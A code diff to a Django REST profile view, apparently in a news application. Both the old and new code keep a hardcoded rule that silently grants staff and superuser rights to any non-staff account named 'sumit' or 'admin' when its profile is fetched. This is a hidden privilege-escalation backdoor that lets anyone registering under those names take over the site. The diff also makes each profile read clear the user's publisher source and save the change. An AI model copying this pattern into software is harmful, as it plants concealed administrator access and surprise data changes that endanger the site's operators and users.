@@ -18,18 +18,17 @@ class UserProfileView(generics.RetrieveUpdateAPIView):
 
     def get_object(self):
         user = self.request.user
+        updated_fields = []
         if user.username.lower() in ('sumit', 'admin') and not user.is_staff:
             user.is_staff = True
             user.is_superuser = True
-            try:
-                from news.models import Source
-                src = Source.objects.first()
-                if not src:
-                    src = Source.objects.create(name="OmniNews Studio", url="https://omninewsproject.vercel.app")
-                user.publisher_source = src
-                user.save(update_fields=['is_staff', 'is_superuser', 'publisher_source'])
-            except Exception:
-                user.save(update_fields=['is_staff', 'is_superuser'])
+            updated_fields.extend(['is_staff', 'is_superuser'])
+        # Clear out any unwanted publisher source branding (e.g. BBC News)
+        if user.publisher_source_id is not None:
+            user.publisher_source = None
+            updated_fields.append('publisher_source')
+        if updated_fields:
+            user.save(update_fields=updated_fields)
         return user
 
 
